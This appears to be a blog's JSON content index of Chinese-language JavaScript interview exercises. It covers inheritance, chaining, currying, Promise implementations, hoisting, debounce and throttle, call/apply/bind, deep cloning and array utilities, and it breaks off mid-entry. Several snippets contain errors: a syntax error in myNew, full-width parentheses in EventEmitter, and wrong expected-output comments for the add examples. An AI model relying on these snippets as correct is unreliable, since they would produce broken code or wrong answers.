prototype.constructor = subType; //增强对象 subType.prototype = prototype; //指定对象&#125;function SuperType(name) &#123; this.name = name; this.colors = [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;];&#125;SuperType.prototype.sayName = function () &#123; console.log(this.name);&#125;;function SubType(name, age) &#123; SuperType.call(this, name); this.age = age;&#125;inheritPrototype(SubType, SuperType);SubType.prototype.sayAge = function () &#123; console.log(this.age);&#125;; 8. Class 继承123456789101112131415161718192021222324252627282930313233343536373839404142434445class Parent &#123; constructor(name) &#123; this.name = name; &#125; static sayHello() &#123; console.log(&quot;hello&quot;); &#125; sayName() &#123; console.log(&quot;my name is &quot; + this.name); return this.name; &#125;&#125;class Child extends Parent &#123; constructor(name, age) &#123; super(name); this.age = age; &#125; sayAge() &#123; console.log(&quot;my age is &quot; + this.age); return this.age; &#125;&#125;let parent = new Parent(&quot;Parent&quot;);let child = new Child(&quot;Child&quot;, 18);console.log(&quot;parent: &quot;, parent); // parent: Parent &#123;name: &quot;Parent&quot;&#125;Parent.sayHello(); // helloparent.sayName(); // my name is Parentconsole.log(&quot;child: &quot;, child); // child: Child &#123;name: &quot;Child&quot;, age: 18&#125;Child.sayHello(); // hellochild.sayName(); // my name is Childchild.sayAge(); // my age is 18// 1、构造器原型链Child.__proto__ === Parent; // trueParent.__proto__ === Function.prototype; // trueFunction.prototype.__proto__ === Object.prototype; // trueObject.prototype.__proto__ === null; // true// 2、实例原型链child.__proto__ === Child.prototype; // trueChild.prototype.__proto__ === Parent.prototype; // trueParent.prototype.__proto__ === Object.prototype; // trueObject.prototype.__proto__ === null; // true","categories":[{"name":"JavaScript 编程题","slug":"JavaScript-编程题","permalink":"https://xuxb.github.io/categories/JavaScript-%E7%BC%96%E7%A8%8B%E9%A2%98/"}],"tags":[{"name":"编程题","slug":"编程题","permalink":"https://xuxb.github.io/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/"}]},{"title":"JS 链式调用与流程控制","slug":"JavaScript 编程题/JS 链式调用与流程控制","date":"2021-03-12T07:32:28.000Z","updated":"2021-04-30T06:59:04.090Z","comments":true,"path":"2021/03/12/JavaScript 编程题/JS 链式调用与流程控制/","link":"","permalink":"https://xuxb.github.io/2021/03/12/JavaScript%20%E7%BC%96%E7%A8%8B%E9%A2%98/JS%20%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%E4%B8%8E%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/","excerpt":"","text":"JS 链式调用与流程控制 能链式调用 能控制程序调用时机（休眠） 同步函数在同一个执行栈中执行 12345678910111213141516171819202122232425262728293031323334353637383940414243const Person = function() &#123; this.tasks = []; setTimeout(() =&gt; &#123; this.next(); &#125;, 0); return this;&#125;Person.prototype.next = function() &#123; const fn = this.tasks.shift(); fn &amp;&amp; fn();&#125;Person.prototype.eat = function() &#123; const fn = () =&gt; &#123; console.log(&#x27;eat&#x27;); this.next(); &#125;; this.tasks.push(fn); return this;&#125;Person.prototype.lunch = function() &#123; const fn = () =&gt; &#123; console.log(&#x27;lunch&#x27;); this.next(); &#125;; this.tasks.push(fn); return this;&#125;Person.prototype.sleep = function(seconds) &#123; const fn = () =&gt; &#123; console.log(`sleep $&#123;seconds&#125; seconds`); setTimeout(() =&gt; &#123; this.next(); &#125;, seconds * 1000) &#125;; this.tasks.push(fn); return this;&#125;const person = new Person();person.eat().sleep(2).lunch().sleep(3).sleep(3)","categories":[{"name":"JavaScript 编程题","slug":"JavaScript-编程题","permalink":"https://xuxb.github.io/categories/JavaScript-%E7%BC%96%E7%A8%8B%E9%A2%98/"}],"tags":[{"name":"编程题","slug":"编程题","permalink":"https://xuxb.github.io/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/"}]},{"title":"JS 链式调用与累加功能","slug":"JavaScript 编程题/JS 链式调用与累加功能","date":"2021-03-12T07:32:28.000Z","updated":"2021-04-30T06:59:20.404Z","comments":true,"path":"2021/03/12/JavaScript 编程题/JS 链式调用与累加功能/","link":"","permalink":"https://xuxb.github.io/2021/03/12/JavaScript%20%E7%BC%96%E7%A8%8B%E9%A2%98/JS%20%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%E4%B8%8E%E7%B4%AF%E5%8A%A0%E5%8A%9F%E8%83%BD/","excerpt":"","text":"JS 链式调用与累加功能1. 实现 add 函数使得满足以下条件需满足的条件： add(1).sum() //=&gt; 1 add(1)(2).sum() //=&gt; 2 add(1)(2)(3).sum() //=&gt; 6 add(1)(2)(3)(4).sum() //=&gt; 10 12345678910111213141516function add(a) &#123; let total = a const fn = function(b) &#123; total += b return fn &#125; fn.sum = function() &#123; return total &#125; return fn&#125;add(1).sum() // =&gt; 1add(1)(2).sum() //=&gt; 3add(1)(2)(3).sum() //=&gt; 6add(1)(2)(3)(4).sum() //=&gt; 10 2. 实现 add 函数使得满足以下条件需满足的条件: add(1) // =&gt; 1; add(1)(2) //=&gt; 3; add(1)(2)(3) //=&gt; 6; add(1)(2)(3)(4) //=&gt; 10; 123456789101112131415function add(num1) &#123; const sum = function(num2) &#123; num1 += num2 return sum &#125; sum.toString = function() &#123; return num1 &#125; return sum&#125;add(1) // output: 1add(1)(2) // output: 3add(1)(2)(3) // output: 4 需满足的条件： add(1); // 1 add(1)(2); // 3 add(1)(2)(3); // 6 add(1)(2, 3); // 6 add(1, 2)(3); // 6 add(1, 2, 3); // 6 12345678910111213141516171819function add(...args1) &#123; let total = args1.reduce((a, b) =&gt; a + b, 0) const sum = function(...args2) &#123; total = args2.reduce((a, b) =&gt; a + b, total) return sum &#125; sum.toString = function() &#123; return total &#125; return sum&#125;add(1) // output: 1add(1)(2) // output: 3add(1)(2)(3) // output: 6add(1)(2, 3) // output: 6add(1, 2)(3) // output: 6add(1, 2, 3) // output: 6","categories":[{"name":"JavaScript 编程题","slug":"JavaScript-编程题","permalink":"https://xuxb.github.io/categories/JavaScript-%E7%BC%96%E7%A8%8B%E9%A2%98/"}],"tags":[{"name":"编程题","slug":"编程题","permalink":"https://xuxb.github.io/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/"}]},{"title":"Promise 简易版实现","slug":"JavaScript 编程题/Promise 简易版实现","date":"2021-03-12T07:32:28.000Z","updated":"2021-05-13T06:36:52.949Z","comments":true,"path":"2021/03/12/JavaScript 编程题/Promise 简易版实现/","link":"","permalink":"https://xuxb.github.io/2021/03/12/JavaScript%20%E7%BC%96%E7%A8%8B%E9%A2%98/Promise%20%E7%AE%80%E6%98%93%E7%89%88%E5%AE%9E%E7%8E%B0/","excerpt":"","text":"Promise 简易版实现 Promise.prototype.then() Promise.prototype.catch() Promise.prototype.finally() Promise.resolve() Promise.reject() Promise.all() Promise.race() Promise.any() Promise.allSettled() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149/** * 1. new Promise时，需要传递一个 executor 执行器，执行器立刻执行 * 2. executor 接受两个参数，分别是 resolve 和 reject * 3. promise 只能从 pending 到 rejected, 或者从 pending 到 fulfilled * 4. promise 的状态一旦确认，就不会再改变 * 5. promise 都有 then 方法，then 接收两个参数，分别是 promise 成功的回调 onFulfilled, * 和 promise 失败的回调 onRejected * 6. 如果调用 then 时，promise已经成功，则执行 onFulfilled，并将promise的值作为参数传递进去。 * 如果promise已经失败，那么执行 onRejected, 并将 promise 失败的原因作为参数传递进去。 * 如果promise的状态是pending，需要将onFulfilled和onRejected函数存放起来，等待状态确定后，再依次将对应的函数执行(发布订阅) * 7. then 的参数 onFulfilled 和 onRejected 可以缺省 * 8. promise 可以then多次，promise 的then 方法返回一个 promise * 9. 如果 then 返回的是一个结果，那么就会把这个结果作为参数，传递给下一个then的成功的回调(onFulfilled) * 10. 如果 then 中抛出了异常，那么就会把这个异常作为参数，传递给下一个then的失败的回调(onRejected) * 11.如果 then 返回的是一个promise,那么需要等这个promise，那么会等这个promise执行完，promise如果成功， * 就走下一个then的成功，如果失败，就走下一个then的失败 */const PENDING = &#x27;pending&#x27;;const FULFILLED = &#x27;fulfilled&#x27;;const REJECTED = &#x27;rejected&#x27;;function Promise(executor) &#123; let self = this; self.status = PENDING; self.onFulfilled = [];//成功的回调 self.onRejected = []; //失败的回调 //PromiseA+ 2.1 function resolve(value) &#123; if (self.status === PENDING) &#123; self.status = FULFILLED; self.value = value; self.onFulfilled.forEach(fn =&gt; fn());//PromiseA+ 2.2.6.1 &#125; &#125; function reject(reason) &#123; if (self.status === PENDING) &#123; self.status = REJECTED; self.reason = reason; self.onRejected.forEach(fn =&gt; fn());//PromiseA+ 2.2.6.2 &#125; &#125; try &#123; executor(resolve, reject); &#125; catch (e) &#123; reject(e); &#125;&#125;Promise.prototype.then = function (onFulfilled, onRejected) &#123; //PromiseA+ 2.2.1 / PromiseA+ 2.2.5 / PromiseA+ 2.2.7.3 / PromiseA+ 2.2.7.4 onFulfilled = typeof onFulfilled === &#x27;function&#x27; ? onFulfilled : value =&gt; value; onRejected = typeof onRejected === &#x27;function&#x27; ? onRejected : reason =&gt; &#123; throw reason &#125;; let self = this; //PromiseA+ 2.2.7 let promise2 = new Promise((resolve, reject) =&gt; &#123; if (self.status === FULFILLED) &#123; //PromiseA+ 2.2.2 //PromiseA+ 2.2.4 --- setTimeout setTimeout(() =&gt; &#123; try &#123; //PromiseA+ 2.2.7.1 let x = onFulfilled(self.value); resolvePromise(promise2, x, resolve, reject); &#125; catch (e) &#123; //PromiseA+ 2.2.7.2 reject(e); &#125; &#125;); &#125; else if (self.status === REJECTED) &#123; //PromiseA+ 2.2.3 setTimeout(() =&gt; &#123; try &#123; let x = onRejected(self.reason); resolvePromise(promise2, x, resolve, reject); &#125; catch (e) &#123; reject(e); &#125; &#125;); &#125; else if (self.status === PENDING) &#123; self.onFulfilled.push(() =&gt; &#123; setTimeout(() =&gt; &#123; try &#123; let x = onFulfilled(self.value); resolvePromise(promise2, x, resolve, reject); &#125; catch (e) &#123; reject(e); &#125; &#125;); &#125;); self.onRejected.push(() =&gt; &#123; setTimeout(() =&gt; &#123; try &#123; let x = onRejected(self.reason); resolvePromise(promise2, x, resolve, reject); &#125; catch (e) &#123; reject(e); &#125; &#125;); &#125;); &#125; &#125;); return promise2;&#125;function resolvePromise(promise2, x, resolve, reject) &#123; let self = this; //PromiseA+ 2.3.1 if (promise2 === x) &#123; reject(new TypeError(&#x27;Chaining cycle&#x27;)); &#125; if (x &amp;&amp; typeof x === &#x27;object&#x27; || typeof x === &#x27;function&#x27;) &#123; let used; //PromiseA+2.3.3.3.3 只能调用一次 try &#123; let then = x.then; if (typeof then === &#x27;function&#x27;) &#123; //PromiseA+2.3.3 then.call(x, (y) =&gt; &#123; //PromiseA+2.3.3.1 if (used) return; used = true; resolvePromise(promise2, y, resolve, reject); &#125;, (r) =&gt; &#123; //PromiseA+2.3.3.2 if (used) return; used = true; reject(r); &#125;); &#125;else&#123; //PromiseA+2.3.3.4 if (used) return; used = true; resolve(x); &#125; &#125; catch (e) &#123; //PromiseA+ 2.3.3.2 if (used) return; used = true; reject(e); &#125; &#125; else &#123; //PromiseA+ 2.3.3.4 resolve(x); &#125;&#125;module.exports = Promise; Promise.allPromise.all(promises) 返回一个 promise 对象 如果传入的参数是一个空的可迭代对象，那么此 promise 对象回调完成(resolve), 只有此情况，是同步执行的，其它都是异步返回的。 如果传入的参数不包含任何 promise，则返回一个异步完成. promises 中所有的 promise 都 “完成”时或参数中不包含 promise 时回调完成。 如果参数中有一个 promise 失败，那么 Promise.all 返回的 promise 对象失败 在任何情况下，Promise.all 返回的 promise 的完成状态的结果都是一个数组 1234567891011121314151617181920212223242526272829Promise.all = async (list) =&gt; &#123; return new Promise((resolve, reject) =&gt; &#123; if (!list || !Array.isArray(list)) throw new Error(&#x27;Type Error&#x27;); if (!list.length) return resolve([]); let index = 0; let resList = []; const processValue = (data, i) =&gt; &#123; index++; resList[i] = data; if (index === list.length) &#123; resolve(resList); &#125; &#125; for (let i = 0; i &lt; list.length; i++) &#123; const item = list[i]; // item 可能为普通值、也可能为 promise 对象 Promise.resolve(item).then((data) =&gt; &#123; processValue(data, i); &#125;).catch((error) =&gt; &#123; reject(error); &#125;) &#125; &#125;);&#125; Promise.racePromise.race 函数返回一个 Promise，它将与第一个传递的 promise 相同的完成方式被完成。它可以是完成（ resolves），也可以是失败（rejects），这要取决于第一个完成的方式是两个中的哪个。 如果传的参数数组是空，则返回的 promise 将永远等待。 如果迭代包含一个或多个非承诺值和/或已解决/拒绝的承诺，则 Promise.race 将解析为迭代中找到的第一个值。 1234567891011121314151617Promise.race = async (list) =&gt; &#123; return new Promise((resolve, reject) =&gt; &#123; if (!list || !Array.isArray(list)) throw new Error(&#x27;Type Error&#x27;); if (!list.length) return resolve(); for (let i = 0; i &lt; list.length; i++) &#123; const item = list[i]; // item 可能为普通值、也可能为 promise 对象 Promise.resolve(item).then((data) =&gt; &#123; resolve(data, i); &#125;).catch((error) =&gt; &#123; reject(error); &#125;) &#125; &#125;);&#125; 参考Promise 的源码实现","categories":[{"name":"JavaScript 编程题","slug":"JavaScript-编程题","permalink":"https://xuxb.github.io/categories/JavaScript-%E7%BC%96%E7%A8%8B%E9%A2%98/"}],"tags":[{"name":"编程题","slug":"编程题","permalink":"https://xuxb.github.io/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/"}]},{"title":"变量提升、this 指向、运算符优先级问题","slug":"JavaScript 编程题/变量提升、this 指向、运算符优先级问题","date":"2021-03-12T07:32:28.000Z","updated":"2021-04-30T06:59:08.062Z","comments":true,"path":"2021/03/12/JavaScript 编程题/变量提升、this 指向、运算符优先级问题/","link":"","permalink":"https://xuxb.github.io/2021/03/12/JavaScript%20%E7%BC%96%E7%A8%8B%E9%A2%98/%E5%8F%98%E9%87%8F%E6%8F%90%E5%8D%87%E3%80%81this%20%E6%8C%87%E5%90%91%E3%80%81%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7%E9%97%AE%E9%A2%98/","excerpt":"","text":"变量提升、this 指向、运算符优先级问题1234567891011121314151617function Foo() &#123; getName = function () &#123; alert (1); &#125;; return this;&#125;Foo.getName = function () &#123; alert (2);&#125;;Foo.prototype.getName = function () &#123; alert (3);&#125;;var getName = function () &#123; alert (4);&#125;;function getName() &#123; alert (5);&#125;//请写出以下输出结果：Foo.getName();getName();Foo().getName();getName();new Foo.getName();new Foo().getName();new new Foo().getName(); 分析： 第一问的 Foo.getName 指向 Foo 函数上存储的静态属性 第二问的 getName 指向的是 function () &#123; alert (4);&#125; 通过 var 声明的变量挂载在 window 对象下 函数 function getName() &#123; alert (5);&#125; 会被提升到最前面 语句 var getName = function () &#123; alert (4);&#125;; 会先进行变量提升，值为 undefined，然后执行到赋值语句时 getName 指向 function () &#123; alert (4);&#125; 第三问的 Foo().getName() 最终指向 function () &#123; alert (1); &#125; Foo() 执行时会将 getName 赋值为 function () &#123; alert (1); &#125; Foo() 执行完成后的返回值为 this，此时 this 指向 window 相当于执行 window.getName() 第四问的 getName，相当于执行 window.getName 第五问的 new Foo.getName() 相当于是 new (Foo.getName)() 第六问的 new Foo().getName() 相当于是 (new Foo()).getName() 第七问的 new new Foo().getName() 相当于是 new ((new Foo()).getName)() 123456789// ---答案---Foo.getName(); // 2getName(); // 4Foo().getName(); // 1getName(); // 1new Foo.getName(); // 2new Foo().getName(); // 3new new Foo().getName(); // 2 相关链接 前端同学经常忽视的一个 JavaScript 面试题","categories":[{"name":"JavaScript 编程题","slug":"JavaScript-编程题","permalink":"https://xuxb.github.io/categories/JavaScript-%E7%BC%96%E7%A8%8B%E9%A2%98/"}],"tags":[{"name":"编程题","slug":"编程题","permalink":"https://xuxb.github.io/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/"}]},{"title":"常见工具函数的实现原理","slug":"JavaScript 编程题/常见工具函数的实现原理","date":"2021-03-12T07:32:28.000Z","updated":"2021-04-30T06:59:12.312Z","comments":true,"path":"2021/03/12/JavaScript 编程题/常见工具函数的实现原理/","link":"","permalink":"https://xuxb.github.io/2021/03/12/JavaScript%20%E7%BC%96%E7%A8%8B%E9%A2%98/%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E5%87%BD%E6%95%B0%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/","excerpt":"","text":"常见工具函数的实现原理[TOC] 防抖函数防抖是 N 秒内函数只会被执行一次，如果 N 秒内再次被触发，则重新计算延迟时间（该方法会在最后一次操作的一段时间后才会执行，如 window.keyup、搜索提示等） 类似于狙击手的瞄准过程，狙击手在瞄准目标之后再过一段稳定时间（防止手抖）后才会射击目标 1234567891011121314151617181920function debounce(fn, delay = 500, immediate = false) &#123; let timer; return function() &#123; const args = arguments; const context = this; if (immediate &amp;&amp; !timer) &#123; fn.apply(context, args); &#125; if (timer) &#123; clearTimeout(timer); &#125; timer = setTimeout(() =&gt; &#123; fn.apply(context, args); &#125;, delay); &#125;&#125;; 节流函数节流是规定一个单位时间，在这个单位时间内最多只能触发一次函数执行（对于频繁操作，任意两次操作只会在一定时间间隔内才会执行，如 window.resize、window.scroll 等事件） 类似于水龙头上的水滴，水滴总会在积累到一定的大小之后才会滴下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// throttle 节流阀 function throttle(fn, delay) &#123; let timeout; let start = new Date(); let threshhold = delay || 200; return function () &#123; let context = this, args = arguments, curr = new Date(); clearTimeout(timeout); //总是干掉事件回调 if (curr - start &gt;= threshhold) &#123; fn.apply(context, args); //只执行一部分方法，这些方法是在某个时间段内执行一次 start = curr; &#125; else &#123; //让方法在脱离事件后也能执行一次 timeout = setTimeout(function () &#123; fn.apply(context, args); &#125;, threshhold); &#125; &#125;; &#125;; // 该实现比较简单，但问题在于执行的始终是某一时间段内的第一个函数，而不是最后一个，可能并不准确 function throttle(fn, delay = 500, immediate = false) &#123; let timer; return function() &#123; const args = arguments; const context = this; if (immediate) &#123; fn.apply(context, args); immediate = false; &#125; if (!timer) &#123; timer = setTimeout(() =&gt; &#123; fn.apply(context, args); timer = null; &#125;, delay); &#125; &#125;&#125;; call、apply 和 bind 函数1234567891011121314151617181920212223242526272829303132333435363738394041424344Function.prototype.$call = function(context) &#123; context = context || window; const fn = +new Date() + &#x27;&#x27; + Math.random(); // 防止同名的 key context[fn] = this; const args = [...arguments].slice(1); const result = eval(&#x27;context[fn](&#x27; + args.toString() +&#x27;)&#x27;) delete context[fn]; return result;&#125;Function.prototype.$apply = function(context, args = []) &#123; context = context || window; const fn = +new Date() + &#x27;&#x27; + Math.random(); // 防止同名的 key context[fn] = this; const result = context[fn](...args); delete context[fn]; return result;&#125;// Function.prototype.bind 方法的实现Function.prototype.$bind = function (context) &#123; let self = this; let args = Array.prototype.slice.call(arguments, 1); let fBind = function () &#123; // 说明：一个绑定函数也能使用 new 操作符创建对象，并需要继承原函数的原型链方法，这种行为就像把原函数当成构造器，提供的 this 值被忽略，同时调用时的参数被提供给模拟函数 // 通过 new 方法使用该绑定函数时，this 指向新创建的对象，则 this instanceof fBind 成立 return this.apply(this instanceof fBind ? this : context, args.concat(arguments)); &#125;; // 用于把原型链传递下去 fBind.prototype = Object.create(this.prototype); // ES5 中才加入 Object.create() 和 Function.prototype.bind，所以 Function.prototype.bind 不能使用时，Object.create() 也不能使用，所以使用中转函数将原型链传递下去 // function F () &#123;&#125; // F.prototype = this.prototype; // fBind.prototype = new F(); return fBind;&#125; 实现 new 操作符使用 new 操作符创建一个对象时，会进行以下步骤： 创建（或者说构造）一个全新的对象。 这个新对象会被执行 [[ 原型 ]] 连接。 这个新对象会绑定到函数调用的 this 。 如果函数没有返回其他对象，那么 new 表达式中的函数调用会自动返回这个新对象。 123456789101112function myNew(fn, ...args) &#123; // let obj = &#123;&#125;; // obj.__proto__ fn.prototype; let obj = Object.create(fn.prototype); let result = fn.apply(obj, ...args); if ((result &amp;&amp; typeof result === &#x27;object&#x27;) || typeof result === &#x27;function&#x27;)) &#123; return result; &#125; return obj;&#125; 实现 instanceof 操作符instanceof 的原理是右侧对象的原型对象（prototype ）是否在左侧对象的原型链上面 123456789101112131415161718function myInstanceof(left, right) &#123; let leftProp = left.__proto__; let rightProp = right.prototype; // 一直会执行循环 直到函数return while (true) &#123; // 遍历到了原型链最顶层 if (leftProp === null) &#123; return false; &#125; if (leftProp === rightProp) &#123; return true; &#125; else &#123; // 遍历赋值__proto__做对比 leftProp = leftProp.__proto__; &#125; &#125;&#125; 实现深度拷贝1234567891011121314151617181920212223242526// 定义一个深拷贝函数 接收目标target参数function deepClone(target) &#123; let result; if (typeof target === &#x27;object&#x27;) &#123; // 如果当前需要深拷贝的是一个对象的话 if (Array.isArray(target)) &#123; result = []; // 将result赋值为一个数组，并且执行遍历 for (let i in target) &#123; result.push(deepClone(target[i])) &#125; &#125; else if (target === null) &#123; result = null; &#125; else if(target.constructor === RegExp)&#123; result = target; &#125; else &#123; result = &#123;&#125;; for (let i in target) &#123; result[i] = deepClone(target[i]); &#125; &#125; &#125; else &#123; // 如果不是对象的话，就是基本数据类型，那么直接赋值 result = target; &#125; return result;&#125; 12345678910111213141516171819202122232425262728293031// 如果是基本数据类型，直接返回// 如果是 RegExp 或者 Date 类型，返回对应类型// 如果是复杂数据类型，递归。// 考虑循环引用的问题function deepClone(obj, hash = new WeakMap()) &#123; //递归拷贝 if (obj instanceof RegExp) return new RegExp(obj); if (obj instanceof Date) return new Date(obj); if (obj === null || typeof obj !== &quot;object&quot;) &#123; //如果不是复杂数据类型，直接返回 return obj; &#125; if (hash.has(obj)) &#123; return hash.get(obj); &#125; /** * 如果obj是数组，那么 obj.constructor 是 [Function: Array] * 如果obj是对象，那么 obj.constructor 是 [Function: Object] */ let t = new obj.constructor(); hash.set(obj, t); for (let key in obj) &#123; //递归 if (obj.hasOwnProperty(key)) &#123; //是否是自身的属性 t[key] = deepClone(obj[key], hash); &#125; &#125; return t;&#125; EventEmitter (发布订阅模式)12345678910111213141516171819202122232425262728293031323334353637383940// 手写发布订阅模式 EventEmitterclass EventEmitter &#123; constructor() &#123; this.events = Object.create(null); &#125; // 实现订阅 on(type, callBack) &#123; if (!this.events[type]) &#123; this.events[type] = []; &#125; this.events[type].push(callBack); &#125; // 删除订阅 off(type, callBack) &#123; if (!this.events[type]) return; this.events[type] = this.events[type].filter(item =&gt; &#123; return item !== callBack; &#125;); &#125; // 只执行一次订阅事件 once(type, callBack) &#123; function fn() &#123; callBack(); this.off(type, fn); &#125; this.on(type, fn); &#125; // 触发事件 emit(type, ...rest) &#123; if（this.events[type]）&#123; this.events[type].forEach(fn =&gt; fn.apply(this, rest)) &#125; &#125;&#125; Promise 实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// Promise 简易版实现原理var Promise = function Promise(fn) &#123; var callbacks = []; var state = &quot;pending&quot;; var value; function handler(callback) &#123; if (state === &quot;pending&quot;) &#123; callbacks.push(callback); return; &#125; var cb = state === &quot;fulfilled&quot; ? callback.fulfilledCb : callback.rejectedCb; if (cb === null) &#123; // then 方法不传任何参数 cb = state === &quot;fulfilled&quot; ? callback.resolve : callback.reject; cb(value); return; &#125; var ret = cb(value); callback.resolve(value); &#125; function execute() &#123; setTimeout(() =&gt; callbacks.map((cb) =&gt; handler(cb)), 0); &#125; function resolve(val) &#123; if (val &amp;&amp; typeof val.then === &quot;function&quot;) &#123; // 判断 resolve() 中的参数是否为 promise 对象 val.then(resolve, reject); return; &#125; value = val; state = &quot;fulfilled&quot;; execute(); &#125; function reject(val) &#123; value = val; state = &quot;rejected&quot;; execute(); &#125; this.then = function (fulfilledCb, rejectedCb) &#123; return new Promise((resolve, reject) =&gt; &#123; handler(&#123; fulfilledCb: fulfilledCb || null, rejectedCb: rejectedCb || null, resolve: resolve, reject: reject, &#125;); &#125;); &#125;; fn(resolve, reject);&#125;;new Promise((resolve, reject) =&gt; &#123; let num = Math.random(); num &gt; 0.5 ? resolve(num) : reject(num);&#125;).then( (num) =&gt; console.log(num), (num) =&gt; console.error(num));","categories":[{"name":"JavaScript 编程题","slug":"JavaScript-编程题","permalink":"https://xuxb.github.io/categories/JavaScript-%E7%BC%96%E7%A8%8B%E9%A2%98/"}],"tags":[{"name":"编程题","slug":"编程题","permalink":"https://xuxb.github.io/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/"}]},{"title":"数组操作","slug":"JavaScript 编程题/数组操作","date":"2021-03-12T07:32:28.000Z","updated":"2021-06-02T06:11:26.168Z","comments":true,"path":"2021/03/12/JavaScript 编程题/数组操作/","link":"","permalink":"https://xuxb.github.io/2021/03/12/JavaScript%20%E7%BC%96%E7%A8%8B%E9%A2%98/%E6%95%B0%E7%BB%84%E6%93%8D%E4%BD%9C/","excerpt":"","text":"数组操作1. 数组扁平化可直接使用 ES6 提供的 flat 方法，如 arr.flat(Infinity)，可使数组扁平化 123456789// 推荐写法var flatten = (arr) =&gt; &#123; if (!Array.isArray(arr)) return arr; return arr.reduce((initArr, item) =&gt; initArr.concat(Array.isArray(item) ? flatten(item) : item), []);&#125;var arr = [1, [2, 3], [4, [5, 6]], 7]console.log(flatten(arr)); // [ 1, 2, 3, 4, 5, 6, 7 ] 123456789101112131415161718// 循环处理var flatten = (arr) =&gt; &#123; let res = []; arr.forEach(item =&gt; &#123; if (Array.isArray(item)) &#123; res.push(...flatten(item)); &#125; else &#123; res.push(item); &#125; &#125;); return res;&#125;var arr = [1, [2, 3], [4, [5, 6]], 7]console.log(flatten(arr)); // [ 1, 2, 3, 4, 5, 6, 7 ] 123456// 针对全是数字项var flatten = (arr) =&gt; &#123; return arr.toString().split(&#x27;,&#x27;).map(item =&gt; +item);&#125;var arr = [1, [2, 3], [4, [5, 6]], 7]console.log(flatten(arr)); // [ 1, 2, 3, 4, 5, 6, 7 ] 2. 数组去重12345678910111213141516// 常规方式const unique = (arr) =&gt; &#123; const res = []; arr.forEach(item =&gt; &#123; if (!res.includes(item)) res.push(item); &#125;); return res;&#125;// 利用数组自带的 apiconst unique = (arr) =&gt; arr.filter((item, index, array) =&gt; array.indexOf(item) === index);// 使用 Setconst unique = (arr) =&gt; [...new Set(arr)]","categories":[{"name":"JavaScript 编程题","slug":"JavaScript-编程题","permalink":"https://xuxb.github.io/categories/JavaScript-%E7%BC%96%E7%A8%8B%E9%A2%98/"}],"tags":[{"name":"编程题","slug":"编程题","permalink":"https://xuxb.github.io/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/"}]},{"title":"浅拷贝与深拷贝","slug":"JavaScript 编程题/浅拷贝与深拷贝","date":"2021-03-12T07:32:28.000Z","updated":"2021-05-31T08:23:33.965Z","comments":true,"path":"2021/03/12/JavaScript 编程题/浅拷贝与深拷贝/","link":"","permalink":"https://xuxb.github.io/2021/03/12/JavaScript%20%E7%BC%96%E7%A8%8B%E9%A2%98/%E6%B5%85%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B7%B1%E6%8B%B7%E8%B4%9D/","excerpt":"","text":"浅拷贝与深拷贝浅拷贝只复制指向某个对象的指针，而不复制对象本身，新旧对象还是共享同一块内存。深拷贝会另外创造一个一模一样的对象，新对象跟原对象不共享内存，修改新对象不会改到原对象。 浅拷贝Object.assign()Object.assign() 方法用于将所有可枚举属性的值从一个或多个源对象分配到目标对象。它将返回目标对象。 123456789var obj = &#123; name: &#x27;Jack&#x27;, books: [1,2,3], info: &#123; address: &#x27;china&#x27; &#125;&#125;;var cloneObj = Object.assign(&#123;&#125;, obj); ... 扩展运算符123456789var obj = &#123; name: &#x27;Jack&#x27;, books: [1,2,3], info: &#123; address: &#x27;china&#x27; &#125;&#125;;var cloneObj = &#123; ...obj &#125;; Array.prototype.concat()Array.prototype.concat() 用于合并两个或多个数组，并返回一个新的数组。为非变异方法，不会修改原数组。 12var arr = [1, 2, [3, 4], 5];var cloneArr = arr.concat(); Array.prototype.slice()Array.prototype.slice() 方法返回一个新的数组对象，这一对象是一个由 begin 和 end 决定的原数组的浅拷贝（包括 begin，不包括 end）。原始数组不会被改变。 12var arr = [1, 2, [3, 4], 5];var cloneArr = arr.slice(); 深拷贝功能要点： 通用遍历 类型判断 递归调用 拷贝函数 循环引用 JSON.stringfy()、JSON.parse()，无法处理函数（变为空对象）和正则（变为 null） 12345678910111213141516171819function deepClone(obj, hash = new WeakMap()) &#123; if (obj === null) return obj; // 如果是null或者undefined我就不进行拷贝操作 if (obj instanceof Date) return new Date(obj); if (obj instanceof RegExp) return new RegExp(obj); // 可能是对象或者普通的值 如果是函数的话是不需要深拷贝 if (typeof obj !== &quot;object&quot;) return obj; // 是对象的话就要进行深拷贝 if (hash.get(obj)) return hash.get(obj); let cloneObj = new obj.constructor(); // 找到的是所属类原型上的constructor,而原型上的 constructor指向的是当前类本身 hash.set(obj, cloneObj); for (let key in obj) &#123; if (obj.hasOwnProperty(key)) &#123; // 实现一个递归拷贝 cloneObj[key] = deepClone(obj[key], hash); &#125; &#125; return cloneObj;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149// ----- 完全版 ----const mapTag = &#x27;[object Map]&#x27;;const setTag = &#x27;[object Set]&#x27;;const arrayTag = &#x27;[object Array]&#x27;;const objectTag = &#x27;[object Object]&#x27;;const argsTag = &#x27;[object Arguments]&#x27;;const boolTag = &#x27;[object Boolean]&#x27;;const dateTag = &#x27;[object Date]&#x27;;const numberTag = &#x27;[object Number]&#x27;;const stringTag = &#x27;[object String]&#x27;;const symbolTag = &#x27;[object 